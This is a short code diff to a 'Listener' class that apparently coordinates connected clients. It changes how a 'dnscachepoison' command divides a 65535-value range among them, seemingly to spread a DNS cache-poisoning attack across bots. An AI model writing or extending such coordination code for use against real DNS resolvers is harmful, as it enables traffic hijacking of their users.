@@ -114,8 +114,8 @@ class Listener:
 
             elif command[0] == "sendall":
                 if command[1] == "dnscachepoison":
-                    step = 5 // len(self.connections)
-                    i = 1
+                    step = 65535 // len(self.connections)
+                    i = 0
                     for connection in self.connections:
                         new_command = command[:]
                         new_command.append(str(i))
